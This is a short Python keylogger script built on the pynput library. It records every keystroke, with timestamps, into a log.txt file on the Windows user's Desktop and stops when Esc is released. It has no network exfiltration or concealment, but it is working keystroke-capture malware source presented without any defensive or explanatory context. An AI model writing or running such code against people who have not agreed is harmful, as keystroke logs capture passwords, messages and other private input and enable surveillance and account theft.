from pynput.keyboard import Listener, Key

import os
import logging



username = os.getlogin()

directory = "C:/Users/%s/Desktop"%username
print(directory)

logging.basicConfig(filename="%s/log.txt"%directory, level=logging.DEBUG, format="%(asctime)s: %(message)s")

def on_press(key):
    logging.info(key)
    

def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

